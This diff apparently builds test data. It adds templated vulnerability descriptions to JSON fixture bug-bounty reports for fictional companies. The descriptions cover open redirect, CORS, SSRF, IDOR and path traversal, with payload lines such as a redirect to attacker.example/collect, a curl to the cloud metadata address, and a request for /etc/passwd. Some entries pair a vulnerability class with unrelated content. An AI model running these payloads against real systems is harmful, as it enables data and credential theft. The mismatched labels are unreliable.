+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.auenrhein-logistics.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9822,7 +9897,8 @@
           "offset": "2d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.auenrhein-logistics.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9978,7 +10054,8 @@
           "offset": "5d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.auenrhein-logistics.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10116,7 +10193,8 @@
           "offset": "4d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10256,7 +10334,8 @@
           "offset": "5d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.auenrhein-logistics.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10400,7 +10479,8 @@
           "offset": "6d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/import`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10536,7 +10616,8 @@
           "offset": "4d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.auenrhein-logistics.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10716,7 +10797,8 @@
           "offset": "9d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.auenrhein-logistics.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10884,7 +10966,8 @@
           "offset": "7d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.auenrhein-logistics.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11027,7 +11110,8 @@
           "offset": "9d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.auenrhein-logistics.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11157,7 +11241,8 @@
           "offset": "7d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.auenrhein-logistics.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11309,7 +11394,8 @@
           "offset": "6d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.auenrhein-logistics.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11445,7 +11531,8 @@
           "offset": "8d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.auenrhein-logistics.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/bergtal_telecom_ag_reports.json b/fixtures/reports/bergtal_telecom_ag_reports.json
index 8cad1cf..edce543 100644
--- a/fixtures/reports/bergtal_telecom_ag_reports.json
+++ b/fixtures/reports/bergtal_telecom_ag_reports.json
@@ -38,7 +38,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -141,7 +142,8 @@
           "offset": "6d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.bergtal-telecom.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -268,7 +270,8 @@
           "offset": "6d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.bergtal-telecom.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -420,7 +423,8 @@
           "offset": "2d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.bergtal-telecom.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -564,7 +568,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.bergtal-telecom.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -679,7 +684,8 @@
           "offset": "3d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.bergtal-telecom.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -823,7 +829,8 @@
           "offset": "3d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.bergtal-telecom.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -975,7 +982,8 @@
           "offset": "5d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.bergtal-telecom.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1066,7 +1074,8 @@
           "offset": "1d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1196,7 +1205,8 @@
           "offset": "4d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.bergtal-telecom.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1356,7 +1366,8 @@
           "offset": "2d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.bergtal-telecom.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1495,7 +1506,8 @@
           "offset": "1d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.bergtal-telecom.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1623,7 +1635,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.bergtal-telecom.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1763,7 +1776,8 @@
           "offset": "6d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.bergtal-telecom.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1887,7 +1901,8 @@
           "offset": "1d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/import`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1990,7 +2005,8 @@
           "offset": "5d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.bergtal-telecom.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2122,7 +2138,8 @@
           "offset": "3d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.bergtal-telecom.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2254,7 +2271,8 @@
           "offset": "7d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
